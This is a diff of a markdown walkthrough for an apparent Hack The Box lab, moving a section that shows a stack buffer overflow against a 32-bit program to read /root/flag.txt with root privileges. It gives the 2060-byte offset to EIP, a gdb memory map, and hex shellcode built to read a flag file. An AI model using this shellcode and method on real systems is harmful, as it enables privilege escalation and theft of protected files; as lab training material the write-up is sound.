@@ -9,33 +9,6 @@ We see that these messages are stored in "/htb-student/msg.txt," which is binary
 Let's see if we can exploit the program with Stack-Based Buffer Overflow to read the file "/root/flag.txt".
 
 
-# Shellcode:
-
-First lets start by generating shell code that can cat a file.
-
-- We can use pwntools for this: https://docs.pwntools.com/en/stable/shellcraft/aarch64.html#pwnlib.shellcraft.aarch64.linux.cat
-
-We'll need to make a flag to test the code:
-
-    echo "HTB{f4lS3_fLag}" > flag.txt
-
-Now use shellcodePwn.py to generatecode to read the file "flag.txt":
-
-    ./shellcodePwn.py 
-    6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
-
-Next, we'll test it:
-
-    ./shellcodeRun.py -s 6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
-    Shellcode Output:
-    HTB{f4lS3_fLag}
-
-Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":
-
-    $ ./shellcodePwn.py 
-    48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
-
-
 # Note:
 
 We need to be aware that this server is using python2, so we may need to adjust our commands accordingly.
@@ -101,10 +74,62 @@ Now that we know we can overwrite the Instruction Pointer, lets see how many byt
 - Since the 32-bit register has been overwritten by 4 bytes of "42", we now know that we need to send 2060 bytes before we reach EIP.
 
 
+# Stack Size:
+
+To inspect the stack size we'll run:
+
+    (gdb) info proc mappings
+    process 2185
+    Mapped address spaces:
+    
+    	Start Addr   End Addr       Size     Offset objfile
+    	0x56555000 0x56556000     0x1000        0x0 /home/htb-student/leave_msg
+    	0x56556000 0x56557000     0x1000        0x0 /home/htb-student/leave_msg
+    	0x56557000 0x56558000     0x1000     0x1000 /home/htb-student/leave_msg
+    	0x56558000 0x56579000    0x21000        0x0 [heap]
+    	0xf7ded000 0xf7fbf000   0x1d2000        0x0 /lib32/libc-2.27.so
+    	0xf7fbf000 0xf7fc0000     0x1000   0x1d2000 /lib32/libc-2.27.so
+    	0xf7fc0000 0xf7fc2000     0x2000   0x1d2000 /lib32/libc-2.27.so
+    	0xf7fc2000 0xf7fc3000     0x1000   0x1d4000 /lib32/libc-2.27.so
+    	0xf7fc3000 0xf7fc6000     0x3000        0x0 
+    	0xf7fcf000 0xf7fd1000     0x2000        0x0 
+    	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
+    	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
+    	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
+    	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
+    	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
+    	0xfffdc000 0xffffe000    0x22000        0x0 [stack]
+
+The stack size is: 0x22000
 
 
+# Read The Flag:
 
+Now that we know how to set EIP, lets exploit the program to read a file with root privileges.
 
+First lets start by generating shell code that can cat a file.
+
+- We can use pwntools for this: https://docs.pwntools.com/en/stable/shellcraft/aarch64.html#pwnlib.shellcraft.aarch64.linux.cat
+
+We'll need to make a flag to test the code:
+
+    echo "HTB{f4lS3_fLag}" > flag.txt
+
+Now use shellcodePwn.py to generatecode to read the file "flag.txt":
+
+    ./shellcodePwn.py 
+    6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
+
+Next, we'll test it:
+
+    ./shellcodeRun.py -s 6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
+    Shellcode Output:
+    HTB{f4lS3_fLag}
+
+Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":
+
+    $ ./shellcodePwn.py 
+    48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
 
 
 
